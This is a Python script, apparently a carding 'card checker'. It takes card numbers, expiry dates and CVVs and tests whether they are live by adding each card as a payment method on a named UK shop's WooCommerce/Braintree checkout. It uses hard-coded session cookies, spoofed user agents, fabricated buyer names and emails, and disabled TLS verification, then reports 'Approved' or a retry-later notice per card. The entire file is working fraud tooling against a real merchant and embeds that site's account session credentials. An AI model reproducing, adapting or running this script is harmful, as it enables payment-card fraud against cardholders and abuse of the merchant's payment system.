def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	r.verify = False
	
	user = user_agent.generate_user_agent()
	
	
	def generate_full_name():
	    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
	                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
	                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
	                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
	                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
	                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
	                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
	                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
	                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
	                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
	    
	    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
	                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
	                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
	                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
	                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
	                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
	                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
	                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
	                   
	    full_name = random.choice(first_names) + " " + random.choice(last_names)
	    first_name, last_name = full_name.split()
	    
	    return first_name, last_name
	
	def generate_address():
	    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
	    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
	    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
	    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
	
	    city = random.choice(cities)
	    state = states[cities.index(city)]
	    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
	    zip_code = zip_codes[states.index(state)]
	
	    return city, state, street_address, zip_code
	
	
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
	
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
	
	
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
	
	
	def generate_random_code(length=32):
	    letters_and_digits = string.ascii_letters + string.digits
	    return ''.join(random.choice(letters_and_digits) for _ in range(length))
	
	corr = generate_random_code()
	
	sess = generate_random_code()
	


	cookies = {
    '_ga': 'GA1.1.242160314.1719582147',
    'eucookielaw': '1735134150572',
    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'bbxbcbb.hhxbfbb%7C1720792129%7C8odriFhtxbPDoz2Iovc0jlupR28BkhASWdY4Q2m5bu2%7Cb58ffc1abe2e70bb1d440862e729e54d1db90a286eff64bc68a5e40a4b185f26',
    '_ga_EX1GV7CW1V': 'GS1.1.1719582147.1.1.1719582533.0.0.0',
    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '196%7Cother%7Cread%7C17e68ee89292728566b1babfb481c435218f1da8fdab4cb8a1ae26bc16b0a5a7',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-01%2021%3A34%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-01%2021%3A34%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_347410393': 'GS1.1.1719869666.5.1.1719870161.0.0.0',
}

	headers = {
    'authority': 'www.carolyngibbsquilts.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '_ga=GA1.1.242160314.1719582147; eucookielaw=1735134150572; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb%7C1720792129%7C8odriFhtxbPDoz2Iovc0jlupR28BkhASWdY4Q2m5bu2%7Cb58ffc1abe2e70bb1d440862e729e54d1db90a286eff64bc68a5e40a4b185f26; _ga_EX1GV7CW1V=GS1.1.1719582147.1.1.1719582533.0.0.0; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=196%7Cother%7Cread%7C17e68ee89292728566b1babfb481c435218f1da8fdab4cb8a1ae26bc16b0a5a7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-01%2021%3A34%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-01%2021%3A34%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fproduct%2Fa-step-forward-for-tilly%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_347410393=GS1.1.1719869666.5.1.1719870161.0.0.0',
    'pragma': 'no-cache',
    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)
	
	
	
	
	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}
	
	data = {
	    'action': 'wc_braintree_credit_card_get_client_token',
	    'nonce': client_token_nonce,
	}
	
	response = r.post('https://www.carolyngibbsquilts.co.uk/wp-admin/admin-ajax.php', headers=headers, data=data, cookies=cookies)
	
	
	
	encoded_text = (response.json()['data'])
	
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	
	
	
	
	import requests
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,ko-KR;q=0.6,ko;q=0.5',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'pragma': 'no-cache',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'd8da16b6-25c1-4f60-a425-6b82ab138809',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	
	
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': user,
}
	
	data = [
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '5.00'),
    ('wc_braintree_paypal_currency', 'GBP'),
    ('wc_braintree_paypal_locale', 'en_gb'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '5.00'),
    ('wc_braintree_credit_card_payment_nonce', tok),
    ('wc_braintree_device_data', '{"correlation_id":"2a69a908c3578910bbb43ae8f1288024"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', add_nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]
	
	response = r.post(
    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	
				
	return result
